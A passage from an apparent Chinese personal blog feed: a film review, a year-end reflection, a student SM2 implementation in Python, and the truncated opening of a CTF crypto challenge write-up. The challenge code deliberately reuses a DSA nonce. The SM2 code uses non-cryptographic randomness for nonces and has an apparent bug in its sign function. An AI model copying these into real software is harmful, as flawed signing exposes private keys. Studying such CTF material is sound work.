    <id>http://sh1k4ku.github.io/2022/05/17/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/</id>
    <published>2022-05-17T13:53:52.000Z</published>
    <updated>2022-05-17T14:45:42.750Z</updated>
    
    <content type="html"><![CDATA[<p>影视鉴赏的最后一节课，老师给放了张艺谋导演的一秒钟，由于这次不再布置作业，也没有当作考试，所以就自己记录一下观后感吧，是一部很优秀的作品，内容也很丰富，回去后凭着记忆随便记点东西<br><span id="more"></span></p><p>《一秒钟》是张艺谋本人拍摄的电影，并且他全程使用胶片拍摄，表达了他在这个数字化时代对胶片的热爱和坚持。电影的背景是文革时代的大西北，整个电影给了茫茫黄土大量的镜头，展示这种自然景观。电影通过看电影展开（套娃，有意思的是里面的电影也是用胶片播放的，有一段剧情是胶片被破坏后，人们用布将胶片抬起来，就像抬棺一样，这也仿佛是胶片电影的结局；而女主所唱的ed，歌词也是在映射胶片，可以理解成胶片的挽歌。电影里还给了胶片很多特写，可以看出张艺谋真的很喜欢胶片。可惜，数字化是时代的潮流，任何事物、甚至是阶级、国家，都挡不住时代潮流。</p><p>电影里最核心的还是男女主，男主是一名劳改犯，从劳改农场逃出来看电影只为见自己的女儿，尽管在影片中只出现了“一秒钟”，这也是标题的来源；女主和她的弟弟是孤儿，所以起名也很简单，为了偷胶片来赔偿别人的“胶片灯罩”，虽然她的父亲对姐弟俩很差，并且据她本人说“早就死了”，但她仍然很想念自己的父亲，渴望父爱。于是，男主寻找女儿，女主寻找父亲，这一对巧合就这样碰撞在一起了。在电影最后，文革结束高考恢复，男主也被劳改所放出来，于是他来到二场（看电影的地方之一）；女主也长大成人，从一个不谙世事的女孩转变为成熟的大人，他们二人一起去沙漠里寻找之前被丢弃的男主女儿的胶片，电影结束。</p><p>在整个故事中，可以看出男主是一个不善言辞的人，易怒、好斗，所以在当时那个时代被人陷害，仅因打架劳改多年，也因此妻离子散，无法与他的女儿相见。尽管女主反复偷窃胶片，但她确实不是坏人——因为弟弟弄坏了别人的胶片台灯，又因为胶片是买不到的，只能去偷，而弟弟也因为邻居小孩的欺凌不敢出门。在这样一个敏感的时代，仿佛每个人的遭遇都充满了不幸，但是从整体上来看，又充满了希望。放映员号召大家一起清洗胶片时，每个人都充满了干劲，以此为己任，全然体现集体主义的美好。《三体1》中，叶文洁的家庭因批斗遭遇不幸，但她住在东北乡村的那段时间全然忘记了生活的苦闷。尽管如此，信号已经发出，过去的事已无法挽回。或许，这便是时代的悲哀吧。</p><p>电影里还有一位刻画的非常饱满的人物，就是放映员。在他的行为举止中，很能看出那个时代里小人物的悲剧。对村民来说，他是高高在上的放映员，表面上呼风唤雨；作为小领导，他害怕自己的职位被他人，不断贬低想要接替他位置的人；同时，他对保卫科的头却点头哈腰（个人理解保卫科的头官位比他大），在他叫保卫科去抓捕男主时不忘祈求对方为自己记上一功。同时，得知男主是劳改犯身份的前后，他的态度大相径庭；而从另一方面，他对自己的工作非常负责，懂得各种技巧，所谓“四个场唯独他会拉长胶片”；最后，这样一位呼风唤雨的大人物，却也有自己的不幸：之所以他的儿子不是接班人，因为他儿子小时错将胶片的清洗液当水喝下，而他因疏忽使儿子烧坏了脑子，只能放牛。而在揭发了男主后，他为保卫科殴打了他感到自责，于是将他女儿的那两篇胶带送给了他，男主也请求他把那个胶片灯罩送给女主，从后来可以看到他确实这么做。1个人认为这个角色是刻画的最细腻的一位。</p><p>最后这段也反映了当时对人权的漠视。男主在被保卫科抓走后，他们抢走了男主女儿的胶片，还扔掉了。面对男主撕心的呼喊，他们做的却只是嘲笑。</p><p>电影还有很多丰富的内容，但是俺可能给忘了qwq，就到此为止吧。这门课确实教给了我很多，有机会的话还想再学一些看电影的方法论。其实自己也知道这是假的，这辈子大概是再也不会去学了，这就像去年的中华文化一般，尽管我知道自己再也不会去看了，但还是想记录下现在的感想。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;影视鉴赏的最后一节课，老师给放了张艺谋导演的一秒钟，由于这次不再布置作业，也没有当作考试，所以就自己记录一下观后感吧，是一部很优秀的作品，内容也很丰富，回去后凭着记忆随便记点东西&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="movie" scheme="http://sh1k4ku.github.io/categories/movie/"/>
    
    
  </entry>
  
  <entry>
    <title>SM2</title>
    <link href="http://sh1k4ku.github.io/2022/03/14/SM2/"/>
    <id>http://sh1k4ku.github.io/2022/03/14/SM2/</id>
    <published>2022-03-14T07:03:44.000Z</published>
    <updated>2022-03-14T07:06:04.555Z</updated>
    
    <content type="html"><![CDATA[<p>大创撸了个sm2（水一下博客</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> sm3, key</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">random_hex = <span class="keyword">lambda</span> x: <span class="string">&#x27;&#x27;</span>.join([choice(<span class="string">&#x27;0123456789abcdef&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#默认的ECC参数</span></span><br><span class="line">default_ecc_paras = &#123;</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DE457283915C45517D722EDB8B08F1DFC3</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> :  <span class="number">0x787968B4FA32C3FD2417842E73BBFEFF2F3C848B6831D7E0EC65228B3937E498</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> :  <span class="number">0x63E4C6D3B23B0C849CF84241484BFE48F61D59A5B16BA06E6E12D1DA27C5249A</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> : (<span class="number">0x421DEBD61B62EAB6746434EBC3CC315E32220B3BADD50BDC4C4E6C147FEDD43D</span>,</span><br><span class="line">           <span class="number">0x0680512BCBB42C07D47349D2153B70C4E5D7FDFCBFA36EA1A85841B9E46E09A2</span>),</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DD297720630485628D5AE74EE7C32E79B7</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#曲线的零点</span></span><br><span class="line">zero_point = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, private_key, public_key, ecc_paras = default_ecc_paras</span>):</span></span><br><span class="line">        self.private_key = private_key</span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.ecc_paras = ecc_paras</span><br><span class="line">        self.para_len = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_point</span>(<span class="params">self, P1, P2</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P2</span><br><span class="line">        <span class="keyword">if</span> P2 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P1</span><br><span class="line"></span><br><span class="line">        (p1x, p1y), (p2x, p2y) = P1, P2</span><br><span class="line">        <span class="keyword">if</span> p1x == p2x <span class="keyword">and</span> (p1y != p2y <span class="keyword">or</span> p1y == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> zero_point</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#计算斜率</span></span><br><span class="line">        <span class="keyword">if</span> p1x == p2x:</span><br><span class="line">            lam = (<span class="number">3</span> * p1x * p1x + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>]) * invert(<span class="number">2</span> * p1y , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lam = (p2y - p1y) * invert(p2x - p1x , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        x = (lam**<span class="number">2</span> - p1x - p2x) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        y = (lam * (p1x - x) - p1y) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">int</span>(x),<span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_kg</span>(<span class="params">self, k, P</span>):</span></span><br><span class="line">        tmp = zero_point</span><br><span class="line">        <span class="keyword">while</span>(k):</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                tmp = self.add_point(tmp, P)</span><br><span class="line">            P = self.add_point(P, P)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len <span class="comment">#格式化坐标</span></span><br><span class="line">        form = form * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> form % (tmp[<span class="number">0</span>], tmp[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">self, data</span>):</span> </span><br><span class="line">        <span class="comment">#data：待签名的信息，private_key:私钥</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> r == <span class="number">0</span> <span class="keyword">or</span> r + k == self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]:</span><br><span class="line">                k = <span class="built_in">int</span>(random_hex(self.para_len), <span class="number">16</span>)</span><br><span class="line">                xy = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">                x = <span class="built_in">int</span>(xy[:self.para_len], <span class="number">16</span>)</span><br><span class="line">                y = <span class="built_in">int</span>(xy[self.para_len:], <span class="number">16</span>)</span><br><span class="line">                r = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">            s = (k - r * self.private_key) * invert(self.private_key + <span class="number">1</span>, self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self, sign, data</span>):</span></span><br><span class="line">        <span class="comment">#sign = (r, s), data：被签名的信息，public_key：公钥</span></span><br><span class="line">        r = <span class="built_in">int</span>(sign[:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(sign[self.para_len:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> r &gt;= <span class="number">1</span> <span class="keyword">and</span> r &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> s &gt;= <span class="number">1</span> <span class="keyword">and</span> s &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;验证失败！&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        P1 = self.get_kg(s, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        P2 = self.get_kg(t, self.public_key)</span><br><span class="line">        </span><br><span class="line">        x, y = self.add_point((<span class="built_in">int</span>(P1[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P1[self.para_len:], <span class="number">16</span>)), </span><br><span class="line">                              (<span class="built_in">int</span>(P2[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P2[self.para_len:], <span class="number">16</span>)))</span><br><span class="line">        R = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> R == r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment">#加密</span></span><br><span class="line">        msg = data.<span class="built_in">hex</span>()</span><br><span class="line">        k = <span class="built_in">int</span>(random_hex(self.para_len),<span class="number">16</span>)</span><br><span class="line">        C1 = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        xy = self.get_kg(k, self.public_key)</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:<span class="number">2</span>*self.para_len]</span><br><span class="line">        mlen = <span class="built_in">len</span>(msg)</span><br><span class="line">        t = sm3.sm3_kdf(xy, mlen/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % mlen</span><br><span class="line">        C2 = form % (<span class="built_in">int</span>(msg, <span class="number">16</span>) ^ <span class="built_in">int</span>(t, <span class="number">16</span>))</span><br><span class="line">        C3 = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (x2, msg, y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (C1, C3, C2))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment">#解密</span></span><br><span class="line">        data = data.<span class="built_in">hex</span>()</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        len_3 = len_2 + <span class="number">64</span></span><br><span class="line">        C1 = data[<span class="number">0</span>:len_2]</span><br><span class="line">        C1x = <span class="built_in">int</span>(C1[:self.para_len],<span class="number">16</span>)</span><br><span class="line">        C1y = <span class="built_in">int</span>(C1[self.para_len:],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> C1y**<span class="number">2</span> % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>] == (C1x**<span class="number">3</span> + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>] * C1x + self.ecc_paras[<span class="string">&#x27;b&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        C3 = data[len_2:len_3]</span><br><span class="line">        C2 = data[len_3:]</span><br><span class="line">        xy = self.get_kg(self.private_key,(C1x, C1y))</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:len_2]</span><br><span class="line">        cl = <span class="built_in">len</span>(C2)</span><br><span class="line">        t = sm3.sm3_kdf(xy, cl/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % cl</span><br><span class="line">        M = form % (<span class="built_in">int</span>(C2,<span class="number">16</span>) ^ <span class="built_in">int</span>(t,<span class="number">16</span>))</span><br><span class="line">        u = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span>% (x2,M,y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(M)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_and_verify</span>():</span></span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    sign_data = sm2_user.sign(data)</span><br><span class="line">    <span class="built_in">print</span>(sm2_user.verify(sign_data, data))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_and_decrypt</span>():</span></span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    en = sm2_user.encrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密后：&#x27;</span>, en)</span><br><span class="line">    de = sm2_user.decrypt(en)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密：&#x27;</span>, de)</span><br><span class="line"></span><br><span class="line">sign_and_verify()</span><br><span class="line">encrypt_and_decrypt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;大创撸了个sm2（水一下博客&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="SM" scheme="http://sh1k4ku.github.io/tags/SM/"/>
    
  </entry>
  
  <entry>
    <title>2021.end</title>
    <link href="http://sh1k4ku.github.io/2021/12/31/2021/2021-end/"/>
    <id>http://sh1k4ku.github.io/2021/12/31/2021/2021-end/</id>
    <published>2021-12-31T07:53:55.000Z</published>
    <updated>2021-12-31T10:04:07.339Z</updated>
    
    <content type="html"><![CDATA[<p>​        本来并不打算写年终总结的，但想着还是随便写点吧，所以还是写点吧，既是回顾，也是自省。</p><span id="more"></span><p>​        总的来说，2021年给我留下的印象并不好，或许是疫情的原因，导致很多事都进行的不顺利。无论是哪个方面，自己都有了很大的变化，或好或坏，都不得而知，总之就是这样了。</p><p>​        首先最想说的还得是CTF，毕竟这个搭建这个blog的目的就是记录+学习。从去年新生赛之后很长一段时间只是在看理论，没有去做题实战，导致最初进步的并不快，不过这也与我个人性格有关，高中时学数学的时候便是如此，我往往喜欢去看，欲在思考中穷尽某一原理或某一题，而不喜欢动笔推导计算，被数学老师上课批评过多次23333。当然，我并不觉得这是一件坏事，我非常享受思考的过程，在现在学习的时候也保持着这个习惯。今年4月从MRCTF（被吊打）后，终于知道大赛是怎么一个模式（或者说难度？），算是正式入坑。</p><p>​        之后印象比较深的是国赛，就在期中考试前，整个team聚集在一个大教室，非常有氛围感。我记得当天10点要考英语，我们8点去网安大楼集合答题。9点40的时候动身去考英语，结果快到教室的时候发现👴没带听力耳机，赶紧往回跑去买个耳机又回考场，然后英语考试就寄了。那能咋办嘛，考完英语接着回网安楼坐着，无缝衔接国赛，看着大🔥干劲满满，这感觉真是太棒了。</p><p>​        暑假到下半年开学后一个月打了很多比赛，觅🐎人斗胆去了两次线下，果然都是坐牢，安洵杯就在成都，AWD模式，化身无情交flag机器。收获就是旅游＋了解线下模式。希望明年能够再学一个方向，线下给队友一点帮助，拿更高的名次（旅游也很棒啊）</p><p>​        &lt;——————————————-我是分割线———————————————-&gt;</p><p>​            现在才发觉以前所知甚少，进入大学后才陆陆续续接触这个社会，才会发现现实是远比文艺作品中更为离谱。在了解到某些事后，会感到如此的震惊、愤懑。有时候经常会钻牛角尖，陷入内耗的状态。这学期选了一门叫《中华文化哲学篇》的课，受益匪浅。截取我的课后感中的一部分：</p><p><img src="/images/2021-end/image-20211231164908017.png" alt="image-20211231164908017"></p><p><img src="/images/2021-end/image-20211231165016407.png" alt="image-20211231165016407"></p><p>最开始上课当然是滑水哈哈哈，但自从放了王德峰老师讲座后便肃然起敬了，只怪自己不能更早意识到这些。离谱的事太多了，要改变更是难于上青天，但还是要做一个有血有肉的人。</p><p>​        由于某些原因，上半年借了hxd一笔钱，也正是运气好，下半年拿了国奖。当时评选结果出来的时候，我的第一想法不是喜悦，而是能还钱了，还是凭本事还的，这比奖学金本身更令人高兴。后来和hxd说起来的时候，他还告诉我一开始怕我过的不好，都没打算要我还钱，呜呜，最后还是还了，但还是有被感动到。</p><p>​        虽然老早以前就有了目标，但因为理想和现实的冲突，仍旧会迷茫。2021这一年一直在思考，思考很多很多东西，大多无果，索性就不去管它，倒也睡的踏实。可能不是我的问题，而是时间的问题。</p><p>​        最后，2021年的最后一点时间里，终究是被时间背刺了。</p><p>​        我与旧事归于尽,来年依旧迎花开。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;​        本来并不打算写年终总结的，但想着还是随便写点吧，所以还是写点吧，既是回顾，也是自省。&lt;/p&gt;</summary>
    
    
    
    <category term="life" scheme="http://sh1k4ku.github.io/categories/life/"/>
    
    
  </entry>
  
  <entry>
    <title>西湖论剑</title>
    <link href="http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2021-11-21T11:49:53.000Z</published>
    <updated>2021-11-21T12:07:00.392Z</updated>
    
    <content type="html"><![CDATA[<p>题目还不错，难度梯度有点大，出了三道，后面三道难的都不会做</p><p>面向WP学习</p><span id="more"></span><h1 id="unknown-dsa"><a href="#unknown-dsa" class="headerlink" title="unknown_dsa"></a>unknown_dsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,m1,m2,ul,vl,wl</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line">    key = DSA.generate(<span class="built_in">int</span>(<span class="number">1024</span>))</span><br><span class="line">    q = key.q</span><br><span class="line">    p = key.p</span><br><span class="line">    g = key.g</span><br><span class="line">    x1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">    x2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">assert</span> x1&lt;q <span class="keyword">and</span> x2&lt;q</span><br><span class="line">    t = powmod(g, p*q-(p+q), p*q)</span><br><span class="line">    hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">    hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line">    k = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    r1 = powmod(g, k, p) % q</span><br><span class="line">    s1 = (hm1 + x1*r1) * invert(k, q) % q</span><br><span class="line">    s2 = (hm2 + x1*r1) * invert(k, q) % q</span><br><span class="line">    r2 = powmod(g, x1, p) % q</span><br><span class="line">    s3 = (hm1 + x2*r2) * invert(k, q) % q</span><br><span class="line">    <span class="built_in">print</span>(p*q, (p-<span class="number">1</span>)//q, t, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r1, s1, s2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2, s3, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ul)):</span><br><span class="line">        <span class="keyword">assert</span> ul[i]**<span class="number">2</span> - wl[i]* vl[i]**<span class="number">2</span>==<span class="number">1</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    cl1 = [<span class="built_in">int</span>(powmod(bytes_to_long(m1), e, x)) <span class="keyword">for</span> x <span class="keyword">in</span> ul]</span><br><span class="line">    cl2 = [<span class="built_in">int</span>(powmod(bytes_to_long(m2), e, y)) <span class="keyword">for</span> y <span class="keyword">in</span> vl]</span><br><span class="line">    <span class="built_in">print</span>(wl, cl1, cl2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    